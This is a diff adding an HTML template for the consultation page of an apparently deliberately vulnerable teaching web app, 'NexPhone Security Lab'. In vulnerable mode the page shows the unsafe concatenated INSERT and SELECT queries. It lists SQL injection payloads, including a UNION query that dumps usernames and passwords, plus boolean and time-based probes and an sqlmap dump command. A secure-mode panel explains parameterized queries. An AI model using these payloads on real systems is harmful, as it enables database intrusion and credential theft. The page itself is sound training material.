@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Consultation — NexPhone Security Lab</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<nav class="nav">
+  <a href="{{ url_for('index') }}" class="nav-brand"><span>⬡</span> NexPhone</a>
+  <ul class="nav-links">
+    <li><a href="{{ url_for('index') }}">Shop</a></li>
+    <li><a href="{{ url_for('search') }}">Search</a></li>
+    <li><a href="{{ url_for('consult') }}" class="active">Consult</a></li>
+    {% if session.get('role') == 'admin' %}<li><a href="{{ url_for('admin') }}">Admin</a></li>{% endif %}
+    {% if session.get('user_id') %}
+    <li><a href="{{ url_for('logout') }}" class="btn btn-outline btn-sm">Logout</a></li>
+    {% else %}
+    <li><a href="{{ url_for('login') }}" class="btn btn-primary btn-sm">Login</a></li>
+    {% endif %}
+  </ul>
+  {% if secure_mode %}
+  <span class="mode-badge secure">Secure Mode</span>
+  {% else %}
+  <span class="mode-badge vuln">Vulnerable Mode</span>
+  {% endif %}
+</nav>
+
+<div class="container page-wrapper" style="display:flex;gap:2.5rem;flex-wrap:wrap;align-items:flex-start;">
+
+  <!-- Form -->
+  <div style="flex:1;min-width:280px;max-width:480px;">
+    <div class="hero" style="padding-bottom:1.5rem;">
+      <p class="hero-label">Expert Advice</p>
+      <h1 class="page-title">Request a Consultation</h1>
+      <p class="page-subtitle">
+        Our specialists will get back to you within 24 hours.
+        {% if not secure_mode %}
+        <br><span style="color:var(--danger);">⚠ This form is vulnerable to SQL Injection.</span>
+        {% endif %}
+      </p>
+    </div>
+
+    {% if success %}
+    <div class="alert alert-success">
+      ✔ Your consultation request has been submitted! We'll contact you soon.
+    </div>
+    {% endif %}
+
+    {% if error %}
+    <div class="alert alert-danger">⚠ {{ error }}</div>
+    {% endif %}
+
+    <div class="form-card" style="max-width:100%;">
+      <form method="POST" action="{{ url_for('consult') }}" autocomplete="off">
+        <div class="form-group">
+          <label class="form-label">Full Name</label>
+          <input type="text" name="name" class="form-control"
+                 placeholder="Your full name" required>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Phone Number</label>
+          <input type="text" name="phone" class="form-control"
+                 placeholder="+1 (555) 000-0000" required>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Message / Question</label>
+          <textarea name="message" class="form-control"
+                    rows="4" placeholder="Tell us about your needs..." required></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;">
+          Submit Request →
+        </button>
+      </form>
+    </div>
+
+    <!-- Raw SQL (vulnerable mode after submit) -->
+    {% if raw_sql %}
+    <div style="margin-top:1.5rem;">
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--danger);text-transform:uppercase;letter-spacing:1px;margin-bottom:.5rem;">
+        ⚡ Executed SQL Query (name field read-back):
+      </p>
+      <div class="sql-box">{{ raw_sql }}</div>
+    </div>
+    {% endif %}
+  </div>
+
+  <!-- Attack Lab -->
+  {% if not secure_mode %}
+  <div style="flex:1;min-width:280px;max-width:460px;">
+    <div class="lab-panel" style="margin-top:0;">
+      <div class="lab-panel-title">Attack Lab — INSERT + UNION Injection</div>
+
+      <p style="color:var(--text-muted);font-size:.82rem;line-height:1.6;margin-bottom:1rem;">
+        The consultation form builds its INSERT and SELECT queries by concatenating user input directly.
+        Inject into <strong>any field</strong>.
+      </p>
+
+      <!-- INSERT query template -->
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--text-muted);margin-bottom:.4rem;">INSERT query (name field):</p>
+      <div class="sql-box">INSERT INTO consultations (name, phone, message)
+VALUES ('{name}', '{phone}', '{message}')</div>
+
+      <!-- Read-back query template -->
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--text-muted);margin-bottom:.4rem;margin-top:.75rem;">SELECT read-back query (name field):</p>
+      <div class="sql-box">SELECT * FROM consultations WHERE name = '{name}'</div>
+
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--warning);text-transform:uppercase;letter-spacing:1px;margin:1rem 0 .5rem;">
+        Attack payloads — paste into Name field:
+      </p>
+      <ul class="payload-list">
+        <li class="payload-item" title="UNION to dump users table">
+          ' UNION SELECT 1, username, password, role FROM users --
+        </li>
+        <li class="payload-item" title="Error-based: too many columns">
+          ' ORDER BY 100 --
+        </li>
+        <li class="payload-item" title="Boolean TRUE — response changes">
+          test' AND '1'='1
+        </li>
+        <li class="payload-item" title="Boolean FALSE — empty result">
+          test' AND '1'='2
+        </li>
+        <li class="payload-item" title="Time-based delay">
+          test' AND randomblob(100000000) AND '1'='1
+        </li>
+      </ul>
+
+      <div style="margin-top:1.25rem;padding:.75rem;background:rgba(255,77,106,.06);border:1px solid rgba(255,77,106,.2);border-radius:8px;">
+        <p style="font-size:.78rem;color:#ff9a9a;line-height:1.6;">
+          <strong>UNION attack:</strong> Submit the UNION payload in the <em>Name</em> field
+          with any phone/message. The response will show exposed user credentials
+          (username / password / role) from the database.
+        </p>
+      </div>
+
+      <div style="margin-top:.75rem;padding:.75rem;background:rgba(255,186,8,.06);border:1px solid rgba(255,186,8,.2);border-radius:8px;">
+        <p style="font-size:.78rem;color:var(--warning);line-height:1.6;">
+          <strong>Error-based:</strong> Use <code class="code-inline">' ORDER BY 100 --</code>
+          to trigger a visible SQL error (column count mismatch).
+        </p>
+      </div>
+
+      <div style="margin-top:.75rem;padding:.75rem;background:rgba(79,158,255,.06);border:1px solid rgba(79,158,255,.2);border-radius:8px;">
+        <p style="font-size:.78rem;color:var(--accent);line-height:1.6;">
+          <strong>SQLMap:</strong><br>
+          <code class="code-inline" style="word-break:break-all;display:block;margin-top:.3rem;">
+            sqlmap -u "http://127.0.0.1:5000/consult" --data="name=test&phone=123&message=hi" --method=POST --dump
+          </code>
+        </p>
+      </div>
+    </div>
+  </div>
+
+  {% else %}
+  <div style="flex:1;min-width:280px;max-width:440px;">
+    <div class="lab-panel" style="margin-top:0;border-color:rgba(46,213,115,.3);">
+      <div class="lab-panel-title" style="color:var(--success);">Defense Active — Parameterized Queries</div>
+      <p style="color:var(--text-muted);font-size:.85rem;line-height:1.6;margin-bottom:1rem;">
+        In Secure Mode, all three fields are bound as <strong>parameters</strong>.
+        Input is escaped automatically by SQLite — no injection is possible.
+      </p>
+      <div class="sql-box secure">INSERT INTO consultations (name, phone, message)
+VALUES (?, ?, ?)
+-- Each ? is bound separately; ' characters cannot escape the string</div>
+      <p style="color:var(--text-muted);font-size:.82rem;margin-top:1rem;">
+        Additionally, input validation enforces field length limits before the query runs.
+      </p>
+    </div>
+  </div>
+  {% endif %}
+
+</div>
+
+<footer class="footer">NexPhone Security Lab · Educational Use Only</footer>
+</body>
+</html>
